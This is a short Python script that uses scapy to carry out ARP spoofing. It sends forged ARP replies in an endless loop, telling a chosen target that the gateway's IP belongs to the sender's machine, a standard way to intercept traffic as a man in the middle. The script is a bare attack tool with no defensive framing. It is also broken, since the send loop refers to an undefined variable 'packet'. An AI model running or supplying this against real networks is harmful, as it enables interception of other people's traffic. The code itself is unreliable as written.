import argparse
import socket
from binascii import hexlify

from scapy.all import *


def main():
    argparser = argparse.ArgumentParser()
    argparser.add_argument('--target_ip')
    argparser.add_argument('--target_mac')
    argparser.add_argument('--gateway_ip')

    args = argparser.parse_args()
    target_ip = args.target_ip
    target_mac = args.target_mac
    gateway_ip = args.gateway_ip

    packet_for_target = Ether(dst=target_mac)/ARP()
    packet_for_target.op = 2
    packet_for_target.psrc = gateway_ip
    packet_for_target.pdst = target_ip

    while True:
        sendp(packet)


if __name__ == '__main__':
    main()
